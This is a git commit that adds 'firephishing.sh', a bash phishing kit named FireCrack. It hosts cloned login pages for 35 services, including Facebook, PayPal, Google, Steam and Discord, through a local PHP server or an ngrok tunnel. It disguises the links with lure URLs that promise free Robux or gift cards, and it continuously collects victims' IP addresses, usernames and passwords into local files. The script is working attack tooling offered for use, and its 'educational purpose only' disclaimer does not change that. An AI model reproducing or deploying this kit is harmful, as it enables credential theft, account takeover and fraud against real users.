9059a97da9463bbe145010b0616d1f91127f2433
Ayomide650 <ahmedayomide1002@gmail.com>
2025-07-22 12:33:08 +0100

    Create firephishing.sh

---
+++ firephishing.sh
@@ -0,0 +1,539 @@
+#!/bin/bash
+
+##   FireCrack 	: 	Automated Phishing Tool
+##   Author 	: 	Firekid
+##   Version 	: 	1.0.0
+##   Github 	: 	https://github.com/Ayomide650/firecrack
+
+## ANSI colors (FG & BG)
+RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
+MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
+REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
+MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
+RESETBG="$(printf '\e[0m\n')"
+
+## Directories
+BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
+
+if [[ ! -d ".server" ]]; then
+	mkdir -p ".server"
+fi
+
+if [[ ! -d "auth" ]]; then
+	mkdir -p "auth"
+fi
+
+if [[ -d ".server/www" ]]; then
+	rm -rf ".server/www"
+	mkdir -p ".server/www"
+else
+	mkdir -p ".server/www"
+fi
+
+## Remove logfile
+if [[ -e ".server/.loclx" ]]; then
+	rm -rf ".server/.loclx"
+fi
+
+if [[ -e ".server/.cld.log" ]]; then
+	rm -rf ".server/.cld.log"
+fi
+
+## Script termination
+exit_on_signal_SIGINT() {
+	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
+	exit 0
+}
+
+exit_on_signal_SIGTERM() {
+	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
+	exit 0
+}
+
+trap exit_on_signal_SIGINT SIGINT
+trap exit_on_signal_SIGTERM SIGTERM
+
+## Reset terminal colors
+reset_color() {
+	tput sgr0   # reset attributes
+	tput op     # reset color
+	return
+}
+
+## Kill already running process
+kill_pid() {
+	check_PID="php"
+	for process in ${check_PID}; do
+		if [[ $(pidof ${process}) ]]; then # Check for Process
+			killall ${process} > /dev/null 2>&1 # Kill the Process
+		fi
+	done
+}
+
+## Check for a newer release
+check_update(){
+	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
+	relase_url='https://api.github.com/repos/yourusername/firecrack/releases/latest'
+	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
+	tarball_url="https://github.com/yourusername/firecrack/archive/refs/tags/${new_version}.tar.gz"
+
+	if [[ $new_version != $__version__ ]]; then
+		echo -ne "${ORANGE}update found\n"${WHITE}
+		sleep 2
+		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
+		pushd "$HOME" > /dev/null 2>&1
+		curl --silent --insecure --fail --retry-connrefused \
+		--retry 3 --retry-delay 2 --location --output ".firecrack.tar.gz" "${tarball_url}"
+
+		if [[ -e ".firecrack.tar.gz" ]]; then
+			tar -xf .firecrack.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
+			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
+			rm -f .firecrack.tar.gz
+			popd > /dev/null 2>&1
+			{ sleep 3; clear; banner_small; }
+			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run firecrack again\n\n"${WHITE}
+			{ reset_color ; exit 1; }
+		else
+			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading."
+			{ reset_color; exit 1; }
+		fi
+	else
+		echo -ne "${GREEN}up to date\n${WHITE}" ; sleep .5
+	fi
+}
+
+## Check Internet Status
+check_status() {
+	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
+	timeout 3s curl -fIs "https://api.github.com" > /dev/null
+	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
+}
+
+## Banner
+banner() {
+	cat <<- EOF
+		${ORANGE}
+		${ORANGE} ______ _           _                     _    
+		${ORANGE}|  ____| |         | |                   | |   
+		${ORANGE}| |__  | | __ _ ___| |__   ___  _ __ __ _| | __
+		${ORANGE}|  __| | |/ _\` / __| '_ \ / _ \| '__/ _\` | |/ /
+		${ORANGE}| |____| | (_| \__ \ | | | (_) | | | (_| |   < 
+		${ORANGE}|______|_|\__,_|___/_| |_|\___/|_|  \__,_|_|\_\
+		${ORANGE}                                      
+		${ORANGE}                         ${RED}Version : ${__version__}
+
+		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by Firekid${WHITE}
+	EOF
+}
+
+## Small Banner
+banner_small() {
+	cat <<- EOF
+		${BLUE}
+		${BLUE}  ░█▀█░█░█░█▀█░█▀▀░█▀█░█▀█░█▀█░█▄█
+		${BLUE}  ░█▀▀░█░█░█▀█░█▀▀░█░█░█░█░█░█░█░█
+		${BLUE}  ░▀░░░▀▀▀░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀
+
+		${CYAN}FireCrack${WHITE} ${__version__}
+	EOF
+}
+
+## Dependencies
+dependencies() {
+	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
+
+	if [[ -d "/data/data/com.termux/files/home" ]]; then
+		if [[ ! $(command -v proot) ]]; then
+			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
+			pkg install proot resolv-conf -y
+		fi
+
+		if [[ ! $(command -v tput) ]]; then
+			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
+			pkg install ncurses-utils -y
+		fi
+	fi
+
+	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
+	else
+		pkgs=(php curl unzip)
+		for pkg in "${pkgs[@]}"; do
+			type -p "$pkg" &>/dev/null || {
+				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
+				if [[ $(command -v pkg) ]]; then
+					pkg install "$pkg" -y
+				elif [[ $(command -v apt) ]]; then
+					sudo apt install "$pkg" -y
+				elif [[ $(command -v apt-get) ]]; then
+					sudo apt-get install "$pkg" -y
+				elif [[ $(command -v pacman) ]]; then
+					sudo pacman -S "$pkg" --noconfirm
+				elif [[ $(command -v dnf) ]]; then
+					sudo dnf -y install "$pkg"
+				elif [[ $(command -v yum) ]]; then
+					sudo yum -y install "$pkg"
+				else
+					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
+					{ reset_color; exit 1; }
+				fi
+			}
+		done
+	fi
+}
+
+# Download Binaries
+download() {
+	url="$1"
+	output="$2"
+	file=`basename $url`
+	if [[ -e "$file" || -e "$output" ]]; then
+		rm -rf "$file" "$output"
+	fi
+	curl --silent --insecure --fail --retry-connrefused \
+		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"
+
+	if [[ -e "$file" ]]; then
+		if [[ ${file#*.} == "zip" ]]; then
+			unzip -qq $file > /dev/null 2>&1
+			mv -f $output .server/$output > /dev/null 2>&1
+		elif [[ ${file#*.} == "tgz" ]]; then
+			tar -zxf $file > /dev/null 2>&1
+			mv -f $output .server/$output > /dev/null 2>&1
+		else
+			mv -f $file .server/$output > /dev/null 2>&1
+		fi
+		chmod +x .server/$output > /dev/null 2>&1
+		rm -rf "$file"
+	else
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
+		{ reset_color; exit 1; }
+	fi
+}
+
+## Install ngrok
+install_ngrok() {
+	if [[ -e ".server/ngrok" ]]; then
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} ngrok already installed."
+	else
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
+		arch=`uname -m`
+		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+			download 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip' 'ngrok'
+		elif [[ "$arch" == *'aarch64'* ]]; then
+			download 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip' 'ngrok'
+		elif [[ "$arch" == *'x86_64'* ]]; then
+			download 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip' 'ngrok'
+		else
+			download 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip' 'ngrok'
+		fi
+	fi
+}
+
+## Start ngrok
+start_ngrok() {
+	ngrok http 80 > /dev/null &
+	NGROK_URL=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[0].public_url')
+	echo "Ngrok URL: $NGROK_URL"
+}
+
+## Setup website and start php server
+setup_site() {
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
+	cp -rf .sites/"$website"/* .server/www
+	cp -f .sites/ip.php .server/www/
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
+	cd .server/www && php -S 0.0.0.0:80 > /dev/null 2>&1 &
+}
+
+## Get IP address
+capture_ip() {
+	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
+	IFS=$'\n'
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
+	cat .server/www/ip.txt >> auth/ip.txt
+}
+
+## Get credentials
+capture_creds() {
+	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
+	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
+	IFS=$'\n'
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
+	cat .server/www/usernames.txt >> auth/usernames.dat
+	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
+}
+
+## Print data
+capture_data() {
+	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
+	while true; do
+		if [[ -e ".server/www/ip.txt" ]]; then
+			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
+			capture_ip
+			rm -rf .server/www/ip.txt
+		fi
+		sleep 0.75
+		if [[ -e ".server/www/usernames.txt" ]]; then
+			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
+			capture_creds
+			rm -rf .server/www/usernames.txt
+		fi
+		sleep 0.75
+	done
+}
+
+## Menu
+main_menu() {
+	{ clear; banner; echo; }
+	cat <<- EOF
+		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
+
+		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
+		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
+		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
+		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox
+		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo
+		${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
+		${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex
+		${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
+		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
+		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
+		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
+		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox
+
+		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
+
+	EOF
+
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+
+	case $REPLY in
+		1 | 01)
+			website="facebook"
+			mask='https://blue-verified-badge-for-facebook-free'
+			tunnel_menu;;
+		2 | 02)
+			website="instagram"
+			mask='https://get-unlimited-followers-for-instagram'
+			tunnel_menu;;
+		3 | 03)
+			website="google"
+			mask='https://get-unlimited-google-drive-free'
+			tunnel_menu;;
+		4 | 04)
+			website="microsoft"
+			mask='https://unlimited-onedrive-space-for-free'
+			tunnel_menu;;
+		5 | 05)
+			website="netflix"
+			mask='https://upgrade-your-netflix-plan-free'
+			tunnel_menu;;
+		6 | 06)
+			website="paypal"
+			mask='https://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		7 | 07)
+			website="steam"
+			mask='https://steam-500-usd-gift-card-free'
+			tunnel_menu;;
+		8 | 08)
+			website="twitter"
+			mask='https://get-blue-badge-on-twitter-free'
+			tunnel_menu;;
+		9 | 09)
+			website="playstation"
+			mask='https://playstation-500-usd-gift-card-free'
+			tunnel_menu;;
+		10)
+			website="tiktok"
+			mask='https://tiktok-free-liker'
+			tunnel_menu;;
+		11)
+			website="twitch"
+			mask='https://unlimited-twitch-tv-user-for-free'
+			tunnel_menu;;
+		12)
+			website="pinterest"
+			mask='https://get-a-premium-plan-for-pinterest-free'
+			tunnel_menu;;
+		13)
+			website="snapchat"
+			mask='https://view-locked-snapchat-accounts-secretly'
+			tunnel_menu;;
+		14)
+			website="linkedin"
+			mask='https://get-a-premium-plan-for-linkedin-free'
+			tunnel_menu;;
+		15)
+			website="ebay"
+			mask='https://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		16)
+			website="quora"
+			mask='https://quora-premium-for-free'
+			tunnel_menu;;
+		17)
+			website="protonmail"
+			mask='https://protonmail-pro-basics-for-free'
+			tunnel_menu;;
+		18)
+			website="spotify"
+			mask='https://convert-your-account-to-spotify-premium'
+			tunnel_menu;;
+		19)
+			website="reddit"
+			mask='https://reddit-official-verified-member-badge'
+			tunnel_menu;;
+		20)
+			website="adobe"
+			mask='https://get-adobe-lifetime-pro-membership-free'
+			tunnel_menu;;
+		21)
+			website="deviantart"
+			mask='https://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		22)
+			website="badoo"
+			mask='https://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		23)
+			website="origin"
+			mask='https://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		24)
+			website="dropbox"
+			mask='https://get-1TB-cloud-storage-free'
+			tunnel_menu;;
+		25)
+			website="yahoo"
+			mask='https://grab-mail-from-anyother-yahoo-account-free'
+			tunnel_menu;;
+		26)
+			website="wordpress"
+			mask='https://unlimited-wordpress-traffic-free'
+			tunnel_menu;;
+		27)
+			website="yandex"
+			mask='https://grab-mail-from-anyother-yandex-account-free'
+			tunnel_menu;;
+		28)
+			website="stackoverflow"
+			mask='https://get-stackoverflow-lifetime-pro-membership-free'
+			tunnel_menu;;
+		29)
+			website="vk"
+			mask='https://vk-premium-real-method-2020'
+			tunnel_menu;;
+		30)
+			website="xbox"
+			mask='https://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		31)
+			website="mediafire"
+			mask='https://get-1TB-on-mediafire-free'
+			tunnel_menu;;
+		32)
+			website="gitlab"
+			mask='https://get-1k-followers-on-gitlab-free'
+			tunnel_menu;;
+		33)
+			website="github"
+			mask='https://get-1k-followers-on-github-free'
+			tunnel_menu;;
+		34)
+			website="discord"
+			mask='https://get-discord-nitro-free'
+			tunnel_menu;;
+		35)
+			website="roblox"
+			mask='https://get-free-robux'
+			tunnel_menu;;
+		99)
+			about;;
+		0 | 00 )
+			msg_exit;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; main_menu; };;
+	esac
+}
+
+## About
+about() {
+	{ clear; banner; echo; }
+	cat <<- EOF
+		${GREEN} Author   ${RED}:  ${ORANGE}Your Name ${RED}[ ${ORANGE}Firekid ${RED}]
+		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/Ayomide650
+		${GREEN} Social   ${RED}:  ${CYAN}https://t.me/unikruzng
+		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
+
+		${WHITE} ${REDBG}Warning:${RESETBG}
+		${CYAN}  This Tool is made for educational purpose
+		  only ${RED}!${WHITE}${CYAN} Author will not be responsible for
+		  any misuse of this toolkit ${RED}!${WHITE}
+
+		${WHITE} ${CYANBG}Special Thanks to:${RESETBG}
+		${GREEN}  1RaY-1, Adi1090x, AliMilani, BDhackers009,
+		  KasRoudra, E343IO, sepp0, ThelinuxChoice,
+		  Yisus7u7
+
+		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
+
+	EOF
+
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	case $REPLY in
+		99)
+			msg_exit;;
+		0 | 00)
+			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
+			{ sleep 1; main_menu; };;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; about; };;
+	esac
+}
+
+## Tunnel selection
+tunnel_menu() {
+	{ clear; banner_small; }
+	cat <<- EOF
+
+		${RED}[${WHITE}01${RED}]${ORANGE} Localhost
+		${RED}[${WHITE}02${RED}]${ORANGE} Ngrok
+
+	EOF
+
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"
+
+	case $REPLY in
+		1 | 01)
+			start_localhost;;
+		2 | 02)
+			start_ngrok;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; tunnel_menu; };;
+	esac
+}
+
+## Start localhost
+start_localhost() {
+	cusport
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	setup_site
+	{ sleep 1; clear; banner_small; }
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
+	capture_data
+}
+
+## Main
+kill_pid
+dependencies
+check_status
+install_ngrok
+main_menu
